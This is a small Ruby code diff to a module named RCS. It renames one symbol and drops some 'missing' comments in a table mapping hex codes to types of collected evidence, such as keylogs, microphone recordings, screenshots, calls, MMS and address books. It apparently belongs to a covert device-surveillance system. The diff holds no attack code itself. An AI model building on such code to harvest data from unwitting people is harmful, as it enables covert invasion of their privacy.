@@ -5,8 +5,8 @@ module RCS
 
 EVIDENCE_TYPES = { 0x0240 => :DEVICE,
                    0x0140 => :CALL,
-                   0x0230 => :CALLIST,     #missing
-                   0xC2C2 => :MIC,         #missing
+                   0x0230 => :CALLLIST,     #missing
+                   0xC2C2 => :MIC,
                    0x0241 => :INFO,
                    0xB9B9 => :SCREENSHOT,
                    0x0040 => :KEYLOG,
@@ -33,7 +33,7 @@ EVIDENCE_TYPES = { 0x0240 => :DEVICE,
                    0x0212 => :MMS,         #missing  #message
                    0x0200 => :ADDRESSBOOK,
                    0x0250 => :IADDRESSBOOK,#missing
-                   0x0201 => :CALENDAR,    #missing
+                   0x0201 => :CALENDAR,
                    0x0202 => :TASK}        #missing
 
 class EvidenceDeserializeError < StandardError
